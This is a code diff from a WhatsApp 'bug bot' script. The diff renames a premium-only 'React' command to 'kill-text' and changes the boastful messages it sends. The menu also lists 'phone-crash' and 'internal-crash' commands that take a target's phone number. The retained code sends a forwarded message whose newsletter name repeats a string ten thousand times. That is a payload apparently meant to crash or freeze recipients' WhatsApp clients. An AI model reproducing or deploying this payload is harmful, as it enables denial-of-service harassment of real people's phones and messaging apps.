@@ -669,7 +669,7 @@ let teksmenu = `*Hello @${m.sender.split("@")[0]}!*
 *=>*  ${prefix}chace-bug 234xxx
 *=>*  ${prefix}phone-crash 234xxx
 *=>*  ${prefix}narutoreact <reply message>
-*=>*  ${prefix}react <reply message>
+*=>*  ${prefix}kill-text <reply message>
 
   Bug external chats 
 *=>*  ${prefix}internal-crash 234xxx,amount
@@ -12997,7 +12997,7 @@ if (!isPremium) return reply(msg.anggazyyprem)
 
 if (!m.quoted) return reply(`Example usage: ${prefix + command} reply chat`)
 
-await anggazyy.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363297279563825@newsletter', newsletterName: `Ednut001`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
+await anggazyy.sendMessage(m.chat, { text: '𝒌𝒊𝒍𝒍𝒆𝒓 𝒕𝒆𝒙𝒕 𝒅𝒓𝒐𝒑𝒑𝒆𝒅 😈', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363297279563825@newsletter', newsletterName: `Ednut001`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
 
 await sleep(2000)
 
@@ -13006,17 +13006,17 @@ await anggazyy.sendMessage(m.chat, { react: { text: '🪲', key: { remoteJid: m.
 }
 
 break        
-case 'React': {
+case 'kill-text': {
 
 if (!isPremium) return reply(msg.anggazyyprem)
 
 if (!m.quoted) return reply(`Example usage: ${prefix + command} reply chat`)
 
-await anggazyy.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363297279563825@newsletter', newsletterName: `Ednut001`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
+await anggazyy.sendMessage(m.chat, { text: '𝒕𝒆𝒙𝒕 𝒌𝒊𝒍𝒍𝒆𝒅 𝒉𝒆𝒓𝒆 👻', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363297279563825@newsletter', newsletterName: `Ednut001`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
 
 await sleep(2000)
 
-await anggazyy.sendMessage(m.chat, { react: { text: '🍁', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
+await anggazyy.sendMessage(m.chat, { react: { text: '☠️', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
 
 }
 
